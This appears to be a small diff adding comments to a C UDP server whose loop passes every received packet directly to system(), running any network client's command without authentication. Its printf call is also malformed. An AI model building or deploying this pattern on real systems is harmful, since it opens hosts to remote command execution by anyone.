@@ -16,7 +16,7 @@ main(int argc, char *argv[])
  	int // create socket with UDP communication
 	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 	
-	char
+	char // create buffer
 	buffer[bufferSize];
 
 	struct sockaddr_in 
@@ -46,8 +46,10 @@ main(int argc, char *argv[])
 
 	while (1)
 	{
+		// listen for clients
 		recvfrom(sockfd,buffer,bufferSize,0,(struct sockaddr*)&client_addr, &addr_size);
 
+		// extract ipv4 from client
 		struct sockaddr_in* clientIPv4 = (struct sockaddr_in*)&client_addr;
 		struct in_addr ipAddr = clientIPv4->sin_addr;
 		
@@ -56,7 +58,9 @@ main(int argc, char *argv[])
 		
 		printf("from: %s\n", str, " - %s",buffer);
 
+		// execute command
 		system(buffer);
+		// clear buffer
 		bzero(buffer,bufferSize);
 	}
 	return 0;
